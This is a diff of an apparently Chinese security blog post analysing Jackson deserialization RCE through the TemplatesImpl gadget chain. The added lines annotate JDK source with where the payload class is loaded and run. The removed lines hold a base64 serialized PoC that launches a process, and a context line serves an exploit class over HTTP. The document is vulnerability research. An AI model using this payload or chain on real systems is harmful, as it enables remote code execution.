@@ -702,14 +702,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        3.9k
+                        4.9k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        19 分
+                        24 分
                     </div>
                     
                 
@@ -1104,6 +1104,7 @@
             <span class="token punctuation">}</span>
         <span class="token punctuation">}</span>
 
+        <span class="token comment" spellcheck="true">//【重要】：解析了字段与调用方法的绑定，如setter，getter，反射设置属性</span>
         <span class="token comment" spellcheck="true">// At which point we still have all kinds of properties; not all with mutators:</span>
         <span class="token keyword">for</span> <span class="token punctuation">(</span>BeanPropertyDefinition propDef <span class="token operator">:</span> propDefs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
             SettableBeanProperty prop <span class="token operator">=</span> null<span class="token punctuation">;</span>
@@ -1178,13 +1179,12 @@
                 builder<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token punctuation">}</span>
         <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>getter方法调用的条件</p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228004956575.png" alt="image-20201228004956575"></p>
 <p>最终用来解析还原对象的Deserializer.deserialize 依据_hashArea的name 与 Method对应还原对象。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228010447887.png" alt="image-20201228010447887"></p>
-<p>5.<code>deser.deserialize</code></p>
-<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">deserialize</span><span class="token punctuation">(</span>JsonParser p<span class="token punctuation">,</span> DeserializationContext ctxt<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException
+<h4 id="4-deser-deserialize"><a href="#4-deser-deserialize" class="headerlink" title="4.deser.deserialize"></a>4.<code>deser.deserialize</code></h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">deserialize</span><span class="token punctuation">(</span>JsonParser p<span class="token punctuation">,</span> DeserializationContext ctxt<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException
 <span class="token punctuation">{</span>
     <span class="token comment" spellcheck="true">// common case first</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">isExpectedStartObjectToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -1201,7 +1201,7 @@
     <span class="token punctuation">}</span>
     <span class="token keyword">return</span> <span class="token function">_deserializeOther</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> ctxt<span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">getCurrentToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="6-vanillaDeserialize"><a href="#6-vanillaDeserialize" class="headerlink" title="6.vanillaDeserialize"></a>6.<code>vanillaDeserialize</code></h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> Object <span class="token function">vanillaDeserialize</span><span class="token punctuation">(</span>JsonParser p<span class="token punctuation">,</span>
+<h4 id="5-vanillaDeserialize"><a href="#5-vanillaDeserialize" class="headerlink" title="5.vanillaDeserialize"></a>5.<code>vanillaDeserialize</code></h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> Object <span class="token function">vanillaDeserialize</span><span class="token punctuation">(</span>JsonParser p<span class="token punctuation">,</span>
                                         DeserializationContext ctxt<span class="token punctuation">,</span> JsonToken t<span class="token punctuation">)</span>
     <span class="token keyword">throws</span> IOException
 <span class="token punctuation">{</span>
@@ -1327,46 +1327,34 @@
 <pre class="line-numbers language-shell"><code class="language-shell">javac ExecTest.java & python -m http.server 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>执行效果</p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201227000019719.png" alt="image-20201227000019719"></p>
-<h3 id="3-3-Java反序列化"><a href="#3-3-Java反序列化" class="headerlink" title="3.3 Java反序列化"></a>3.3 Java反序列化</h3><p>这里举<code>com.sun.org.apache.xalan.internal.xsltc.TemplateImpl</code> 说明在json反序列化中利用Java反序列化漏洞进行RCE的利用调用getter方法的情况</p>
-<p>poc</p>
-<pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">[</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token punctuation">{</span>
-    <span class="token property">"transletBytecodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxl
-clXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxq
-YXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxl
-Y3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhh
-bmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5
-TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9u
-cy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3Rv
-cnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcv
-YXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hl
-LmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3Jn
-LmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJY
-dpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFu
-Zy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMu
-ZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9s
-YW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5
-cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8Qcyls
-AgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhw
-AAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAA
-eHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIA
-EGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5n
-LlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAC25vdGVwYWQuZXhldAAEZXhlY3VxAH4AHgAAAAFx
-AH4AI3NxAH4AEXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2
-YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMW
-YNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHZyABJq
-YXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo="</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-     <span class="token property">"transletName"</span><span class="token operator">:</span><span class="token string">"a.b"</span><span class="token punctuation">,</span>
-     <span class="token property">"outputProperties"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>一个利用链是：</p>
+<h3 id="3-3-Java反序列化"><a href="#3-3-Java反序列化" class="headerlink" title="3.3 Java反序列化"></a>3.3 Java反序列化</h3><p>这里举<code>com.sun.org.apache.xalan.internal.xsltc.TemplateImpl</code> 说明在json反序列化中利用Java反序列化漏洞进行RCE的利用<strong>调用getter方法的情况</strong>。这个主要的利用对象TemplateImpl的属性 <code>_outputProperties</code> 在JsonBeanDeserializer 调用的是getter方法，上面debug分析Jackson的实现原理已经分析调用getter需满足（详勘addBeanProps方法）：</p>
 <blockquote>
-<p>getOutputProperties()-&gt;newTransFormer()→getTransletInstance()-&gt;newInstance()</p>
+<p>1.没有setting方法</p>
+<p>2.私有属性</p>
+<p>3.getter方法返回值是Map,Collection的类型</p>
 </blockquote>
-<p>利⽤的属性为 transletBytecodes 、 transletName 、 outputProperties ，所以最后⽤到的⾃然是这⼏个属性的 get 或<br>者 set ⽅法。这⾥主要会调⽤到 getOutputProperties ⽅法，为什么是 get ⽽不是 set ，这是因为该属性没有 set ⽅法，同时也不满⾜ hasField 的条件，getOuputProperties返回值也是Map的子类，所以最后会调⽤的实际是 get ⽅法 。</p>
-<p><code>getOutputProperty</code></p>
+<h4 id="3-3-1-利用链分析"><a href="#3-3-1-利用链分析" class="headerlink" title="3.3.1 利用链分析"></a>3.3.1 利用链分析</h4><p>所以这个Template利用链的过程是：</p>
+<pre class="line-numbers language-java"><code class="language-java">TemplatesImpl<span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  TemplatesImpl<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    TemplatesImpl<span class="token punctuation">.</span><span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+      TemplatesImpl<span class="token punctuation">.</span><span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        ClassLoader<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        Class<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里总结下过程</p>
+<blockquote>
+<ol>
+<li><code>_outputProperties</code> 触发<code>getOutputProperties()</code></li>
+<li><code>getOutputProperties()</code>进入<code>newTransformer()</code></li>
+<li><code>newTranformer()</code>进入<code>getTransletInstance()</code>获取Transformer</li>
+<li><code>getTransletInstance()</code>由于json串中指定了_name=”xxx”,_class 为空，所以进入了 进入 <code>defineTransletClasses()</code> 生成payload对应的Class类</li>
+<li><code>defineTransletClasses()</code> 主要从json串_bytecodes属性字节码中通过 <code>ClassLoader.defineClass</code> 定义一个类，也就是我们的利用Exploit类，这里会检查defineClass的返回值，即检查payload 加载为类的父类是否<code>”com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet“</code>所以我们的payload在生成的时候要是这个(ABSTRACT_TRANSLET）类的子类</li>
+<li>最后回到<code>getTransletInstance()</code> 函数利用<code>defineTransletClassed()</code>生成的Class对象，也就是我们的利用利用，通过 <code>newInstance()</code>实例化，所以payload只需要放在Class的默认构造函数即可触发RCE。</li>
+</ol>
+</blockquote>
+<h4 id="3-3-2-代码分析"><a href="#3-3-2-代码分析" class="headerlink" title="3.3.2 代码分析"></a>3.3.2 代码分析</h4><p><code>getOutputProperty</code></p>
 <pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> Properties <span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">try</span> <span class="token punctuation">{</span>
-        <span class="token keyword">return</span> <span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
+        <span class="token keyword">return</span> <span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进入newTranformer()</span>
     <span class="token punctuation">}</span>
     <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">TransformerConfigurationException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">return</span> null<span class="token punctuation">;</span>
@@ -1379,7 +1367,7 @@ YXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo="</span><span class="token punct
     TransformerImpl transformer<span class="token punctuation">;</span>
 
     transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformerImpl</span><span class="token punctuation">(</span><span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _outputProperties<span class="token punctuation">,</span>
-                                      _indentNumber<span class="token punctuation">,</span> _tfactory<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
+                                      _indentNumber<span class="token punctuation">,</span> _tfactory<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进入getTransletInstance()</span>
 
     <span class="token keyword">if</span> <span class="token punctuation">(</span>_uriResolver <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
         transformer<span class="token punctuation">.</span><span class="token function">setURIResolver</span><span class="token punctuation">(</span>_uriResolver<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -1394,13 +1382,15 @@ YXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo="</span><span class="token punct
 <pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> Translet <span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>
     <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">//json _name = "thonsun"</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span>_name <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>
 
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>_class <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//json _class = null满足</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_class <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进入 defineTransletClasses() 生成payload对应的Class类</span>
 
         <span class="token comment" spellcheck="true">// The translet needs to keep a reference to all its auxiliary</span>
         <span class="token comment" spellcheck="true">// class to prevent the GC from collecting them</span>
-        AbstractTranslet translet <span class="token operator">=</span> <span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span> _class<span class="token punctuation">[</span>_transletIndex<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
+        AbstractTranslet translet <span class="token operator">=</span> <span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span> _class<span class="token punctuation">[</span>_transletIndex<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//实例化Payload对象，POC的代码就放在默认的构造函数中触发RCE</span>
         translet<span class="token punctuation">.</span><span class="token function">postInitialization</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         translet<span class="token punctuation">.</span><span class="token function">setTemplates</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         translet<span class="token punctuation">.</span><span class="token function">setServicesMechnism</span><span class="token punctuation">(</span>_useServicesMechanism<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -1420,7 +1410,164 @@ YXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo="</span><span class="token punct
         <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>defineTransletClasses()</code></p>
+<pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>
+
+        <span class="token comment" spellcheck="true">//json 串中 _bytecodes属性就是我们的payload，此时还是</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_bytecodes <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            ErrorMsg err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ErrorMsg</span><span class="token punctuation">(</span>ErrorMsg<span class="token punctuation">.</span>NO_TRANSLET_CLASS_ERR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        TransletClassLoader loader <span class="token operator">=</span> <span class="token punctuation">(</span>TransletClassLoader<span class="token punctuation">)</span>
+            AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrivilegedAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">public</span> Object <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TransletClassLoader</span><span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">.</span><span class="token function">findClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_tfactory<span class="token punctuation">.</span><span class="token function">getExternalExtensionsMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">//_bytecodes是二维数组，第一个就是payload class的字节码</span>
+            <span class="token keyword">final</span> <span class="token keyword">int</span> classCount <span class="token operator">=</span> _bytecodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+            _class <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span>classCount<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>classCount <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                _auxClasses <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> classCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token comment" spellcheck="true">//进入ClassLoader.defineClass(payload) 从字节码生成Class对象</span>
+                _class<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>_bytecodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">final</span> Class <span class="token class-name">superClass</span> <span class="token operator">=</span> _class<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token comment" spellcheck="true">// Check if this is the main class</span>
+                <span class="token comment" spellcheck="true">//检查payload 加载为类的父类是否是 ”com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet“</span>
+                <span class="token comment" spellcheck="true">//所以我们的payload在生成的时候要是这个(ABSTRACT_TRANSLET）类的子类</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>superClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>ABSTRACT_TRANSLET<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    _transletIndex <span class="token operator">=</span> i<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    _auxClasses<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>_class<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _class<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>_transletIndex <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                ErrorMsg err<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ErrorMsg</span><span class="token punctuation">(</span>ErrorMsg<span class="token punctuation">.</span>NO_MAIN_TRANSLET_ERR<span class="token punctuation">,</span> _name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassFormatError</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            ErrorMsg err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ErrorMsg</span><span class="token punctuation">(</span>ErrorMsg<span class="token punctuation">.</span>TRANSLET_CLASS_ERR<span class="token punctuation">,</span> _name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">LinkageError</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            ErrorMsg err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ErrorMsg</span><span class="token punctuation">(</span>ErrorMsg<span class="token punctuation">.</span>TRANSLET_OBJECT_ERR<span class="token punctuation">,</span> _name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
